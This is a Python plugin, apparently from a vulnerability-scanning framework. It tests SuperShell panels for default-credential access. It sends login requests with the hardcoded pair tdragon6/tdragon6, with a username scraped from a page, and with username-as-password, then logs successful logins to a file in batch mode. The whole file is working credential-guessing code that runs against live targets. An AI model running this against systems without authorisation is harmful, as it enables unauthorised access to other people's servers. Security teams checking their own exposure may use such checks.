import json
import re
import urllib3,requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class SuperShellMrPass_Scan:
    def run(self,url):
        base_url = url + "/supershell/login/auth"
        headers = {
            "User-Agent":self.headers["User-Agent"],
            "Content-Type": "application/json"
        }
        data = {"username":"tdragon6","password":"tdragon6"}
        try:
            response = requests.post(base_url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout,json=data)
            json_str = json.loads(response.text)

            if "success" == json_str.get("result"):
                OutPrintInfoSuc("SuperShell", f"目标存在默认密钥漏洞:{base_url} | tdragon6/tdragon6")
                if self.batch:
                    OutPutFile("supershell_moren_passwd.txt",f"目标存在默认密钥漏洞: {base_url} | tdragon6/tdragon6")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SuperShell", "目标不存在SuperShell默认密钥漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("SuperShell", "目标请求出错")
                return False

    def run2(self,url):
        username = None
        baseurl = url + "/supershell/log/.js"
        try:
            req = requests.get(baseurl, headers=self.headers, proxies=self.proxy, verify=self.ssl, timeout=self.timeout)
            if "Hacker" not in req.text:
                username = "admin"
            pattern = r'<div class="d-none d-xl-block ps-2">\s*<div>(.*?)<\/div>'
            match = re.search(pattern, req.text, re.DOTALL)
            if match:
                username = match.group(1).strip()
        except Exception:
            pass
        base_url = url + "/supershell/login/auth"
        headers = {
            "User-Agent":self.headers["User-Agent"],
            "Content-Type": "application/json"
        }
        data = {"username":username,"password":"tdragon6"}
        try:
            response = requests.post(base_url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout,json=data)
            json_str = json.loads(response.text)

            if "success" == json_str.get("result"):
                OutPrintInfoSuc("SuperShell", f"目标存在默认密钥漏洞:{base_url} | {username}/tdragon6")
                if self.batch:
                    OutPutFile("supershell_moren_passwd.txt",f"目标存在默认密钥漏洞: {base_url} | {username}/tdragon6")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SuperShell", "目标不存在SuperShell默认密钥漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("SuperShell", "目标请求出错")
                return False
    def run3(self,url):
        username = None
        baseurl = url + "/supershell/log/.js"
        try:
            req = requests.get(baseurl, headers=self.headers, proxies=self.proxy, verify=self.ssl, timeout=self.timeout)
            if "Hacker" not in req.text:
                username = "admin"
            pattern = r'<div class="d-none d-xl-block ps-2">\s*<div>(.*?)<\/div>'
            match = re.search(pattern, req.text, re.DOTALL)
            if match:
                username = match.group(1).strip()
        except Exception:
            pass
        base_url = url + "/supershell/login/auth"
        headers = {
            "User-Agent":self.headers["User-Agent"],
            "Content-Type": "application/json"
        }
        if username == None:
            username = "admin"
        data = {"username":username,"password":username}
        try:
            response = requests.post(base_url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout,json=data)
            json_str = json.loads(response.text)

            if "success" == json_str.get("result"):
                OutPrintInfoSuc("SuperShell", f"目标存在默认密钥漏洞:{base_url} | {username}/{username}")
                if self.batch:
                    OutPutFile("supershell_moren_passwd.txt",f"目标存在默认密钥漏洞: {base_url} | {username}/{username}")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SuperShell", "目标不存在SuperShell默认密钥漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("SuperShell", "目标请求出错")
                return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        headers = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=headers, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("SuperShell", f"开始检测SuperShell默认密钥漏洞...")
        poc_list = [
            self.run,
            self.run2,
            self.run3,



        ]
        for poc in poc_list:
            if poc(url):
                break
        if not self.batch:
            OutPrintInfo("SuperShell", f"SuperShell默认密钥漏洞检测结束")

